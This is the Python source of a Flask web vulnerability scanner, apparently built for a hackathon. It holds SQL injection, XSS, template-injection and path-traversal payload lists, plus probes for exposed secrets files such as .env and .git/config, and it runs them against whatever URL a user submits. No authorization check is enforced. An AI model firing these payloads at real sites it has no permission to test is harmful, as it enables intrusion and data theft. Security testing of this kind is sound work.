#!/usr/bin/env python3
"""
Advanced Web Vulnerability Scanner — Web Interface v2.0
Deploy on Render.com | Enter URL in browser, no code changes needed
"""

import os, re, ssl, time, json, uuid, socket, threading, warnings
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qsl
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify, redirect

warnings.filterwarnings("ignore")
try: requests.packages.urllib3.disable_warnings()
except: pass

try:    import dns.resolver;    DNS_AVAILABLE   = True
except: DNS_AVAILABLE = False

try:    import whois as wh;     WHOIS_AVAILABLE = True
except: WHOIS_AVAILABLE = False

try:    import google.generativeai as genai; GEMINI_AVAILABLE = True
except: GEMINI_AVAILABLE = False

# ── Config ──────────────────────────────────────────────────────────────────
GEMINI_ENV   = os.environ.get("GEMINI_API_KEY", "")
REQ_TIMEOUT  = 8
MAX_THREADS  = 10
SCAN_DELAY   = 0.12
MAX_CRAWL    = 12

app   = Flask(__name__)
scans = {}   # scan_id -> ScanJob

# ════════════════════════════════════════════════════════════════════════════
#  PAYLOADS
# ════════════════════════════════════════════════════════════════════════════

SQL_PAYLOADS = [
    "'", '"', "''", "\\'",
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
    "\" OR \"1\"=\"1",  "\" OR 1=1--",
    "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 AND 1=1", "1 AND 1=2",
    "' AND SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "admin'--", "admin'#", "' OR 'x'='x",
    "') OR ('1'='1", "admin' OR 1=1--",
    "%27", "1%27 OR 1=1",
]

SQL_ERRORS = [
    r"sql syntax.*mysql", r"warning.*mysql_",
    r"you have an error in your sql syntax",
    r"check the manual that corresponds to your (mysql|mariadb)",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"microsoft ole db provider for odbc",
    r"pg_exec\(\)", r"ora-\d{5}", r"oracle error",
    r"sqlite_.*error", r"error.*sqlite",
    r"sql server.*driver", r"mssql_query\(",
    r"syntax error.*in query expression",
    r"data type mismatch in criteria",
    r"invalid column name", r"unknown column",
    r"right syntax to use near",
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '{{7*7}}', '${7*7}', '#{7*7}',
]

SENSITIVE_FILES = [
    "/.env", "/.env.local", "/.env.backup", "/.env.prod",
    "/.git/config", "/.git/HEAD",
    "/config.php", "/wp-config.php", "/configuration.php",
    "/config.yml", "/config.json", "/database.yml", "/secrets.yml",
    "/.htaccess", "/.htpasswd", "/web.config",
    "/phpinfo.php", "/info.php", "/test.php",
    "/backup.sql", "/dump.sql", "/db.sql", "/database.sql",
    "/backup.zip", "/backup.tar.gz", "/site.zip",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/xmlrpc.php", "/wp-login.php",
    "/composer.json", "/package.json",
    "/server-status", "/server-info", "/.DS_Store",
    "/swagger.json", "/api-docs", "/graphql", "/graphiql",
    "/readme.md", "/README.md", "/CHANGELOG.md",
    "/.bash_history",
]

ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/login", "/administrator",
    "/wp-admin", "/wp-login.php", "/phpmyadmin", "/pma/",
    "/dashboard", "/panel", "/controlpanel", "/manage",
    "/cms", "/login", "/login.php", "/signin",
    "/user/login", "/account/login", "/auth/login",
    "/cpanel", "/webmin", "/secure", "/backend",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

LFI_INDICATORS = ["root:x:", "bin:x:", "daemon:x:", "[extensions]", "[fonts]"]

OPEN_REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "returnTo", "return_url",
    "redirect_url", "goto", "target", "redir", "destination", "dest",
]

SECURITY_HEADERS = {
    "X-Frame-Options":        {"desc": "Clickjacking protection",       "risk": "HIGH",   "rec": "DENY"},
    "X-XSS-Protection":       {"desc": "Browser XSS filter",            "risk": "MEDIUM", "rec": "1; mode=block"},
    "X-Content-Type-Options": {"desc": "MIME sniffing protection",       "risk": "MEDIUM", "rec": "nosniff"},
    "Strict-Transport-Security": {"desc": "Force HTTPS (HSTS)",          "risk": "HIGH",   "rec": "max-age=31536000; includeSubDomains"},
    "Content-Security-Policy": {"desc": "XSS & injection protection",   "risk": "HIGH",   "rec": "default-src 'self'"},
    "Referrer-Policy":         {"desc": "Controls referrer info",        "risk": "LOW",    "rec": "strict-origin-when-cross-origin"},
    "Permissions-Policy":      {"desc": "Browser feature control",       "risk": "LOW",    "rec": "geolocation=(), microphone=()"},
}

# ════════════════════════════════════════════════════════════════════════════
#  SCAN JOB
# ════════════════════════════════════════════════════════════════════════════

class ScanJob:
    def __init__(self, url, gemini_key=""):
        self.id          = str(uuid.uuid4())[:8]
        self.url         = url
        self.gemini_key  = gemini_key.strip() or GEMINI_ENV
        self.status      = "running"
        self.logs        = []
        self.results     = {}
        self.vulns       = []
        self.ai_analysis = ""
        self.start       = time.time()
        self.elapsed     = 0

    def log(self, msg, level="INFO"):
        self.logs.append({
            "msg": str(msg), "level": level,
            "time": datetime.now().strftime("%H:%M:%S"),
        })

    def add_vuln(self, vtype, detail):
        self.vulns.append({"type": vtype, "detail": detail})
        self.log(f"★ VULN: {vtype} — {str(detail)[:80]}", "VULN")

    def done(self):
        self.status  = "done"
        self.elapsed = round(time.time() - self.start, 1)


# ════════════════════════════════════════════════════════════════════════════
#  HTTP HELPER
# ════════════════════════════════════════════════════════════════════════════

def req(url, method="GET", params=None, data=None,
        headers=None, allow_redirects=True):
    h = {
        "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/122.0.0.0 Safari/537.36"),
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }
    if headers: h.update(headers)
    try:
        return requests.request(
            method, url, params=params, data=data,
            headers=h, allow_redirects=allow_redirects,
            timeout=REQ_TIMEOUT, verify=False,
        )
    except: return None


# ════════════════════════════════════════════════════════════════════════════
#  CRAWLER — finds pages with URL params automatically
# ════════════════════════════════════════════════════════════════════════════

def crawl_param_urls(base_url, job):
    """Crawl homepage and find all URLs that have query parameters."""
    job.log("Crawling site to find pages with URL parameters...", "INFO")
    found = set()
    try:
        resp = req(base_url)
        if not resp: return []
        soup = BeautifulSoup(resp.text, "html.parser")
        base_domain = urlparse(base_url).netloc

        for tag in soup.find_all(["a", "form"], href=True):
            href = tag.get("href", "")
            full = urljoin(base_url, href)
            p    = urlparse(full)
            if p.netloc == base_domain and p.query and full not in found:
                found.add(full)

        # Also find links in <a> tags (correct attribute)
        for a in soup.find_all("a", href=True):
            href = a["href"]
            full = urljoin(base_url, href)
            p    = urlparse(full)
            if p.netloc == base_domain and p.query:
                found.add(full)

    except Exception as e:
        job.log(f"Crawler error: {e}", "WARN")

    result = list(found)[:MAX_CRAWL]
    job.log(f"Crawler found {len(result)} URL(s) with parameters to test", "OK")
    for u in result:
        job.log(f"  → {u}", "INFO")
    return result


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 1 — RECONNAISSANCE
# ════════════════════════════════════════════════════════════════════════════

def run_recon(url, job):
    job.log("══ MODULE 1 — RECONNAISSANCE ══", "HEAD")
    parsed = urlparse(url)
    host   = parsed.netloc.split(":")[0]
    result = {}

    # IP
    try:
        ip = socket.gethostbyname(host)
        result["ip"] = ip
        job.log(f"IP Address   : {ip}", "OK")
    except:
        result["ip"] = "Unknown"

    # DNS
    if DNS_AVAILABLE:
        dns_data = {}
        for rtype in ["A", "MX", "NS", "TXT"]:
            try:
                answers = dns.resolver.resolve(host, rtype)
                records = [str(r) for r in answers]
                dns_data[rtype] = records
                job.log(f"DNS {rtype:<4}    : {', '.join(records[:2])}", "OK")
            except: pass
        result["dns"] = dns_data
    else:
        job.log("dnspython not installed — skipping DNS", "SKIP")

    # WHOIS
    if WHOIS_AVAILABLE:
        try:
            w       = wh.whois(host)
            created = w.creation_date
            if isinstance(created, list): created = created[0]
            result["whois"] = {
                "registrar": str(w.registrar or "N/A"),
                "created":   str(created or "N/A"),
            }
            job.log(f"Registrar    : {w.registrar}", "OK")
            job.log(f"Created      : {created}", "OK")
        except:
            job.log("WHOIS lookup failed", "WARN")

    # Fingerprint
    resp = req(url)
    if resp:
        h         = resp.headers
        server    = h.get("Server", "")
        powered   = h.get("X-Powered-By", "")
        tech      = []
        body      = resp.text.lower()

        if server:
            tech.append(f"Server: {server}")
            job.log(f"Server       : {server} ← info disclosure!", "WARN")
        if powered:
            tech.append(f"X-Powered-By: {powered}")
            job.log(f"X-Powered-By : {powered} ← version leaked!", "VULN")
            job.add_vuln("Info Disclosure", f"X-Powered-By: {powered}")

        for cms, sigs in {
            "WordPress":  ["wp-content", "wp-includes"],
            "Joomla":     ["joomla", "/components/"],
            "Drupal":     ["drupal", "sites/default/files"],
            "Laravel":    ["laravel", "laravel_session"],
            "Django":     ["csrfmiddlewaretoken"],
        }.items():
            if any(s in body + str(h.get("Set-Cookie","")).lower() for s in sigs):
                tech.append(f"Framework: {cms}")
                job.log(f"Framework    : {cms} detected", "WARN")

        # Cookie flags
        for cookie in resp.cookies:
            flags = []
            sc_header = h.get("Set-Cookie", "").lower()
            if not cookie.secure:
                flags.append("Missing Secure flag")
            if "httponly" not in sc_header:
                flags.append("Missing HttpOnly flag")
            if "samesite" not in sc_header:
                flags.append("Missing SameSite flag")
            if flags:
                msg = f"Cookie '{cookie.name}': {', '.join(flags)}"
                job.log(msg, "VULN")
                job.add_vuln("Insecure Cookie", msg)

        result["technologies"] = tech

    job.results["recon"] = result
    return result


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 2 — SECURITY HEADERS
# ════════════════════════════════════════════════════════════════════════════

def run_headers(url, job):
    job.log("══ MODULE 2 — SECURITY HEADERS ══", "HEAD")
    resp = req(url)
    if not resp:
        job.log("Cannot reach target", "WARN")
        return {}

    headers_lc = {k.lower(): v for k, v in resp.headers.items()}
    missing, present, misconfig = [], [], []

    for hdr, info in SECURITY_HEADERS.items():
        hl = hdr.lower()
        if hl in headers_lc:
            val = headers_lc[hl]
            job.log(f"✓ {hdr}: {val[:60]}", "OK")
            present.append({"header": hdr, "value": val})
            # Check weak CSP
            if hdr == "Content-Security-Policy" and (
                "unsafe-inline" in val or "unsafe-eval" in val
            ):
                job.log(f"  ↳ Weak CSP: unsafe-inline/eval present!", "WARN")
                job.add_vuln("Weak CSP", f"unsafe-inline or unsafe-eval in CSP")
        else:
            risk = info["risk"]
            job.log(f"✗ MISSING {hdr} [{risk} RISK] — {info['desc']}", "VULN")
            missing.append({"header": hdr, "risk": risk, "fix": f"{hdr}: {info['rec']}"})
            if risk == "HIGH":
                job.add_vuln(f"Missing Header ({risk})", f"No {hdr} header — {info['desc']}")

    # Info leaking headers
    for lh in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"]:
        if lh.lower() in headers_lc:
            val = headers_lc[lh.lower()]
            job.log(f"⚠ LEAK: {lh}: {val}", "WARN")
            misconfig.append({"header": lh, "value": val, "fix": f"Remove {lh} header"})

    result = {"missing": missing, "present": present, "misconfigured": misconfig}
    job.results["headers"] = result
    return result


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 3 — SSL/TLS
# ════════════════════════════════════════════════════════════════════════════

def run_ssl(url, job):
    job.log("══ MODULE 3 — SSL/TLS ANALYSIS ══", "HEAD")
    parsed = urlparse(url)
    result = {}

    if parsed.scheme != "https":
        job.log("CRITICAL: Site NOT using HTTPS! All traffic is plaintext.", "VULN")
        job.add_vuln("No HTTPS", "Site transmits data in cleartext over HTTP")
        result["https"] = False
        job.results["ssl"] = result
        return result

    result["https"] = True
    host = parsed.hostname
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(6)
            s.connect((host, 443))
            cert    = s.getpeercert()
            version = s.version()

        job.log(f"TLS Version  : {version}", "OK")
        if version in ("TLSv1", "TLSv1.1"):
            job.log(f"Weak TLS version {version}! Upgrade to 1.2+", "VULN")
            job.add_vuln("Weak TLS", f"Using deprecated {version}")

        exp_str  = cert.get("notAfter", "")
        exp_date = datetime.strptime(exp_str, "%b %d %H:%M:%S %Y %Z")
        days     = (exp_date - datetime.utcnow()).days

        if days < 0:
            job.log(f"CERT EXPIRED {abs(days)} days ago!", "VULN")
            job.add_vuln("Expired SSL Certificate", f"Expired {abs(days)} days ago")
        elif days < 30:
            job.log(f"Cert expires in {days} days (renew soon!)", "WARN")
        else:
            job.log(f"Cert valid for {days} more days", "OK")

        subject = dict(x[0] for x in cert.get("subject", []))
        issuer  = dict(x[0] for x in cert.get("issuer",  []))
        job.log(f"CN           : {subject.get('commonName','N/A')}", "OK")
        job.log(f"Issuer       : {issuer.get('organizationName','N/A')}", "OK")
        result["cert"] = {"days_left": days, "tls_version": version}

    except ssl.SSLCertVerificationError as e:
        job.log(f"SSL Cert Verification FAILED: {e}", "VULN")
        job.add_vuln("Invalid SSL Certificate", str(e))
    except Exception as e:
        job.log(f"SSL check error: {e}", "WARN")

    # HTTP redirect check
    http_url = url.replace("https://", "http://")
    r = req(http_url, allow_redirects=False)
    if r:
        if r.status_code in (301, 302, 307, 308):
            loc = r.headers.get("Location", "")
            if "https://" in loc:
                job.log("HTTP→HTTPS redirect: Configured ✓", "OK")
            else:
                job.log("HTTP redirect doesn't force HTTPS!", "WARN")
        elif r.status_code == 200:
            job.log("HTTP accessible without redirect!", "VULN")
            job.add_vuln("Missing HTTPS Redirect", "HTTP version is directly accessible")

    job.results["ssl"] = result
    return result


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 4 — SENSITIVE FILES
# ════════════════════════════════════════════════════════════════════════════

def run_files(url, job):
    job.log("══ MODULE 4 — SENSITIVE FILES & ADMIN PANELS ══", "HEAD")
    base      = url.rstrip("/")
    sensitive = []
    admins    = []

    def probe(path, category):
        r = req(base + path, allow_redirects=False)
        if r and r.status_code in (200, 401, 403):
            return path, r.status_code, len(r.content), category
        return None

    all_paths = [(p, "sensitive") for p in SENSITIVE_FILES] + \
                [(p, "admin")     for p in ADMIN_PATHS]

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        futures = {ex.submit(probe, p, c): (p, c) for p, c in all_paths}
        for fut in as_completed(futures):
            res = fut.result()
            if res:
                path, status, size, cat = res
                label = "EXPOSED" if status == 200 else "EXISTS(protected)"
                job.log(f"[{status}] {label}: {base}{path} ({size} bytes)", "VULN")
                entry = {"path": path, "url": base+path, "status": status}
                if cat == "sensitive":
                    sensitive.append(entry)
                    job.add_vuln("Sensitive File Exposed", f"{base}{path} [{status}]")
                else:
                    admins.append(entry)
                    if status == 200:
                        job.add_vuln("Admin Panel Found", f"{base}{path}")

    job.log(f"Found {len(sensitive)} sensitive files, {len(admins)} admin panels", "INFO")
    result = {"sensitive": sensitive, "admin_panels": admins}
    job.results["files"] = result
    return result


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 5 — SQL INJECTION
# ════════════════════════════════════════════════════════════════════════════

def test_sqli_url(target_url, job):
    """Test one URL (with params) for SQL injection."""
    parsed = urlparse(target_url)
    if not parsed.query: return []
    params  = dict(parse_qsl(parsed.query))
    found   = []

    for param in params:
        for payload in SQL_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r  = req(target_url, params=tp)
            if r:
                body = r.text.lower()
                for err in SQL_ERRORS:
                    if re.search(err, body, re.IGNORECASE):
                        vuln = {"type": "Error-Based SQLi",
                                "param": param, "payload": payload,
                                "url": target_url}
                        if vuln not in found:
                            found.append(vuln)
                            job.log(f"★ SQLi FOUND! Param:'{param}' Payload:{payload[:30]}", "VULN")
                            job.add_vuln("SQL Injection", f"Param '{param}' on {target_url[:60]}")
                        break
            time.sleep(SCAN_DELAY)
    return found


def test_sqli_forms(base_url, job):
    resp = req(base_url)
    if not resp: return []
    soup  = BeautifulSoup(resp.text, "html.parser")
    forms = soup.find_all("form")
    found = []
    for form in forms:
        action = urljoin(base_url, form.get("action", base_url))
        method = form.get("method", "get").lower()
        fields = {inp.get("name"): "test"
                  for inp in form.find_all(["input","textarea"])
                  if inp.get("name")}
        if not fields: continue
        for field in fields:
            for payload in SQL_PAYLOADS[:10]:
                data = fields.copy(); data[field] = payload
                r = (req(action, method="POST", data=data) if method=="post"
                     else req(action, params=data))
                if r:
                    body = r.text.lower()
                    for err in SQL_ERRORS:
                        if re.search(err, body, re.IGNORECASE):
                            v = {"type": "SQLi (Form)", "field": field,
                                 "form": action, "payload": payload}
                            found.append(v)
                            job.log(f"★ SQLi FORM! Field:'{field}' → {action[:50]}", "VULN")
                            job.add_vuln("SQL Injection (Form)", f"Field '{field}' on {action[:60]}")
                            break
                time.sleep(SCAN_DELAY)
    return found


def run_sqli(urls_to_test, job):
    job.log(f"══ MODULE 5 — SQL INJECTION ({len(urls_to_test)} URL(s)) ══", "HEAD")
    all_found = []
    for u in urls_to_test:
        job.log(f"Testing: {u[:70]}", "INFO")
        all_found.extend(test_sqli_url(u, job))
    all_found.extend(test_sqli_forms(urls_to_test[0] if urls_to_test else "", job))
    if not all_found:
        job.log("No SQL injection found in tested URLs", "OK")
    job.results["sqli"] = {"vulnerable": all_found}
    return all_found


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 6 — XSS
# ════════════════════════════════════════════════════════════════════════════

def test_xss_url(target_url, job):
    parsed = urlparse(target_url)
    if not parsed.query: return []
    params = dict(parse_qsl(parsed.query))
    found  = []
    for param in params:
        for payload in XSS_PAYLOADS:
            tp = params.copy(); tp[param] = payload
            r  = req(target_url, params=tp)
            if r and payload in r.text:
                # SSTI check
                if payload in ("{{7*7}}","${7*7}","#{7*7}") and "49" in r.text:
                    job.log(f"★ SSTI DETECTED! Param:'{param}'", "VULN")
                    job.add_vuln("Server-Side Template Injection", f"Param '{param}'")
                else:
                    job.log(f"★ XSS FOUND! Param:'{param}'", "VULN")
                    job.add_vuln("Reflected XSS", f"Param '{param}' on {target_url[:60]}")
                found.append({"param": param, "payload": payload, "url": target_url})
                break
            time.sleep(SCAN_DELAY)
    return found


def test_xss_forms(base_url, job):
    resp = req(base_url)
    if not resp: return []
    soup  = BeautifulSoup(resp.text, "html.parser")
    forms = soup.find_all("form")
    found = []
    for form in forms:
        action = urljoin(base_url, form.get("action", base_url))
        method = form.get("method", "get").lower()
        fields = {
            inp.get("name"): "safe"
            for inp in form.find_all(["input","textarea"])
            if inp.get("name") and inp.get("type","text").lower()
               not in ["submit","hidden","image"]
        }
        for field in fields:
            for payload in XSS_PAYLOADS[:8]:
                data = fields.copy(); data[field] = payload
                r = (req(action, method="POST", data=data) if method=="post"
                     else req(action, params=data))
                if r and payload in r.text:
                    job.log(f"★ XSS (FORM)! Field:'{field}'", "VULN")
                    job.add_vuln("Reflected XSS (Form)", f"Field '{field}' on {action[:60]}")
                    found.append({"field": field, "payload": payload, "form": action})
                    break
                time.sleep(SCAN_DELAY)
    return found


def run_xss(urls_to_test, job):
    job.log(f"══ MODULE 6 — XSS ({len(urls_to_test)} URL(s)) ══", "HEAD")
    found = []
    for u in urls_to_test:
        job.log(f"Testing: {u[:70]}", "INFO")
        found.extend(test_xss_url(u, job))
    found.extend(test_xss_forms(urls_to_test[0] if urls_to_test else "", job))
    if not found:
        job.log("No XSS found in tested URLs", "OK")
    job.results["xss"] = {"vulnerable": found}
    return found


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 7 — CORS
# ════════════════════════════════════════════════════════════════════════════

def run_cors(url, job):
    job.log("══ MODULE 7 — CORS MISCONFIGURATION ══", "HEAD")
    found = []
    for origin in ["https://evil-attacker.com", "null",
                   "https://attacker.example.com"]:
        r = req(url, headers={"Origin": origin})
        if not r: continue
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "false")
        if acao == "*":
            job.log("CORS Wildcard (*) — check if credentials are used", "WARN")
        elif acao == origin:
            sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
            job.log(f"★ CORS MISCONFIGURATION! Origin reflected [{sev}]", "VULN")
            job.add_vuln(f"CORS Misconfiguration ({sev})",
                         f"Origin '{origin}' reflected, credentials={acac}")
            found.append({"origin": origin, "acao": acao, "credentials": acac})
        else:
            job.log(f"CORS OK — '{origin[:30]}' rejected", "OK")
    job.results["cors"] = {"vulnerable": found}
    return found


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 8 — HTTP METHODS
# ════════════════════════════════════════════════════════════════════════════

def run_methods(url, job):
    job.log("══ MODULE 8 — HTTP METHODS ══", "HEAD")
    dangerous = []
    r = req(url, method="OPTIONS")
    if r:
        allow = r.headers.get("Allow","") or r.headers.get("Access-Control-Allow-Methods","")
        if allow:
            job.log(f"Allowed: {allow}", "INFO")
            for m in ["PUT","DELETE","TRACE","CONNECT"]:
                if m in allow:
                    job.log(f"★ Dangerous method ALLOWED: {m}", "VULN")
                    job.add_vuln("Dangerous HTTP Method", f"{m} method enabled")
                    dangerous.append(m)

    r2 = req(url, method="TRACE")
    if r2 and r2.status_code == 200 and "TRACE" in r2.text.upper():
        job.log("★ TRACE enabled — XST attack possible!", "VULN")
        job.add_vuln("XST via TRACE", "TRACE method reflects headers (XST attack)")
        dangerous.append("TRACE")

    if not dangerous:
        job.log("No dangerous HTTP methods found", "OK")
    job.results["methods"] = {"dangerous": dangerous}
    return dangerous


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 9 — LFI / CSRF / OPEN REDIRECT
# ════════════════════════════════════════════════════════════════════════════

def run_other(urls_to_test, job):
    job.log("══ MODULE 9 — LFI / CSRF / OPEN REDIRECT ══", "HEAD")
    base_url = urls_to_test[0] if urls_to_test else ""
    lfi, csrf, redir = [], [], []

    # LFI
    for target_url in urls_to_test:
        parsed = urlparse(target_url)
        params = dict(parse_qsl(parsed.query))
        file_params = {k: v for k, v in params.items()
                       if any(kw in k.lower() for kw in
                              ["file","path","page","include","load","view","doc","template"])}
        for param in file_params:
            for payload in LFI_PAYLOADS:
                tp = params.copy(); tp[param] = payload
                r  = req(target_url, params=tp)
                if r and any(ind in r.text for ind in LFI_INDICATORS):
                    job.log(f"★ LFI! Param:'{param}' Payload:{payload}", "VULN")
                    job.add_vuln("Local File Inclusion", f"Param '{param}'")
                    lfi.append({"param": param, "payload": payload, "url": target_url})
                    break
                time.sleep(SCAN_DELAY)

    # CSRF
    resp = req(base_url)
    if resp:
        soup  = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        for i, form in enumerate(forms):
            if form.get("method","get").lower() != "post": continue
            inputs   = form.find_all("input")
            has_csrf = any(
                any(kw in (inp.get("name","") + inp.get("id","")).lower()
                    for kw in ["csrf","token","_token","xsrf","nonce","authenticity"])
                for inp in inputs
            )
            if not has_csrf:
                action = urljoin(base_url, form.get("action", base_url))
                job.log(f"★ CSRF token missing in POST form → {action[:50]}", "VULN")
                job.add_vuln("CSRF Missing Token", f"POST form: {action[:60]}")
                csrf.append({"form": action})

    # Open Redirect
    for target_url in urls_to_test:
        parsed = urlparse(target_url)
        params = dict(parse_qsl(parsed.query))
        for param in params:
            if param.lower() in OPEN_REDIRECT_PARAMS:
                tp = params.copy(); tp[param] = "https://evil-attacker.com"
                r  = req(target_url, params=tp, allow_redirects=False)
                if r and r.status_code in (301,302,303,307,308):
                    loc = r.headers.get("Location","")
                    if "evil-attacker.com" in loc:
                        job.log(f"★ OPEN REDIRECT! Param:'{param}'", "VULN")
                        job.add_vuln("Open Redirect", f"Param '{param}'")
                        redir.append({"param": param, "url": target_url})

    job.results["other"] = {"lfi": lfi, "csrf": csrf, "open_redirect": redir}


# ════════════════════════════════════════════════════════════════════════════
#  MODULE 10 — GEMINI AI
# ════════════════════════════════════════════════════════════════════════════

def run_gemini(job):
    job.log("══ MODULE 10 — GEMINI AI ANALYSIS ══", "HEAD")
    key = job.gemini_key
    if not GEMINI_AVAILABLE or not key or key in ("YOUR_GEMINI_API_KEY_HERE",""):
        job.log("Gemini key not set — skipping AI analysis", "SKIP")
        job.log("Get free key: https://aistudio.google.com/app/apikey", "INFO")
        return ""

    job.log("Sending results to Gemini AI...", "INFO")
    try:
        genai.configure(api_key=key)

        # Try multiple model names (fixes the v1beta 404 error)
        model = None
        for model_name in ["gemini-1.5-flash-latest", "gemini-1.5-flash",
                           "gemini-pro", "gemini-1.0-pro"]:
            try:
                model = genai.GenerativeModel(model_name)
                # Quick test
                model.generate_content("test", generation_config={"max_output_tokens": 5})
                job.log(f"Using Gemini model: {model_name}", "OK")
                break
            except Exception as e:
                job.log(f"Model {model_name} not available: {str(e)[:50]}", "SKIP")
                model = None

        if not model:
            job.log("No Gemini model available for your API key", "WARN")
            return ""

        vuln_summary = json.dumps(job.vulns, indent=2, default=str)[:3000]
        prompt = f"""
You are a senior penetration tester. Analyze this scan of: {job.url}

VULNERABILITIES FOUND ({len(job.vulns)} total):
{vuln_summary}

Provide:
## 1. RISK LEVEL: CRITICAL / HIGH / MEDIUM / LOW
One sentence why.

## 2. SECURITY SCORE: X/100
Brief reason.

## 3. TOP VULNERABILITIES
For each vuln found:
- What is it (simple explanation)
- How attacker exploits it (step by step)
- Business impact
- Exact fix with code example

## 4. PRIORITY FIX ORDER
Numbered list of what to fix first.

## 5. HACKATHON TIPS
How to present these findings impressively at IIT Kanpur hackathon.

Be concise, technical, and actionable. Respond in clean markdown.
"""
        resp = model.generate_content(
            prompt,
            generation_config={"max_output_tokens": 1500}
        )
        ai_text = resp.text
        job.log("Gemini AI analysis complete!", "OK")
        job.ai_analysis = ai_text
        return ai_text

    except Exception as e:
        job.log(f"Gemini error: {e}", "WARN")
        return ""


# ════════════════════════════════════════════════════════════════════════════
#  MAIN SCAN RUNNER
# ════════════════════════════════════════════════════════════════════════════

def run_scan(job: ScanJob):
    try:
        job.log(f"Starting scan: {job.url}", "INFO")
        job.log("⚠  Scanning ONLY authorized targets", "WARN")

        # Crawl to find parameterized URLs
        crawled = crawl_param_urls(job.url, job)

        # If user provided a URL with params, include it too
        if urlparse(job.url).query and job.url not in crawled:
            crawled.insert(0, job.url)

        # If no params found, use base URL (headers/SSL/files still work)
        urls_for_injection = crawled if crawled else [job.url]

        # Run all modules
        run_recon(job.url, job)
        run_headers(job.url, job)
        run_ssl(job.url, job)
        run_files(job.url, job)
        run_sqli(urls_for_injection, job)
        run_xss(urls_for_injection, job)
        run_cors(job.url, job)
        run_methods(job.url, job)
        run_other(urls_for_injection, job)
        run_gemini(job)

    except Exception as e:
        job.log(f"Scanner error: {e}", "WARN")
    finally:
        job.done()
        job.log(f"✓ Scan complete — {len(job.vulns)} vulnerabilities found in {job.elapsed}s", "OK")


# ════════════════════════════════════════════════════════════════════════════
#  HTML TEMPLATE
# ════════════════════════════════════════════════════════════════════════════

HOME_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Web Vulnerability Scanner</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', monospace;
    background: #0d1117;
    color: #e6edf3;
    min-height: 100vh;
  }
  .header {
    background: linear-gradient(135deg, #161b22 0%, #0d1117 100%);
    border-bottom: 1px solid #30363d;
    padding: 20px 40px;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .header h1 { font-size: 1.4rem; color: #58a6ff; }
  .badge {
    background: #388bfd20;
    border: 1px solid #388bfd40;
    color: #58a6ff;
    padding: 2px 10px;
    border-radius: 20px;
    font-size: 0.75rem;
  }
  .container { max-width: 900px; margin: 0 auto; padding: 30px 20px; }

  /* Form */
  .scan-card {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 12px;
    padding: 28px;
    margin-bottom: 24px;
  }
  .scan-card h2 { color: #f0f6fc; margin-bottom: 6px; font-size: 1.1rem; }
  .scan-card p  { color: #8b949e; font-size: 0.85rem; margin-bottom: 20px; }
  .input-group  { margin-bottom: 14px; }
  .input-group label { display: block; color: #8b949e; font-size: 0.8rem; margin-bottom: 6px; }
  .input-group input {
    width: 100%;
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 8px;
    padding: 10px 14px;
    color: #e6edf3;
    font-size: 0.95rem;
    outline: none;
    transition: border-color 0.2s;
  }
  .input-group input:focus { border-color: #58a6ff; }
  .btn-scan {
    background: linear-gradient(135deg, #238636, #2ea043);
    border: none;
    color: #fff;
    padding: 11px 28px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 0.95rem;
    font-weight: 600;
    transition: opacity 0.2s;
    width: 100%;
    margin-top: 6px;
  }
  .btn-scan:hover { opacity: 0.9; }
  .btn-scan:disabled { opacity: 0.5; cursor: not-allowed; }
  .targets {
    background: #0d1117;
    border: 1px solid #21262d;
    border-radius: 8px;
    padding: 14px;
    margin-top: 14px;
  }
  .targets p { color: #8b949e; font-size: 0.8rem; margin-bottom: 8px; }
  .targets a {
    color: #58a6ff; text-decoration: none; font-size: 0.8rem;
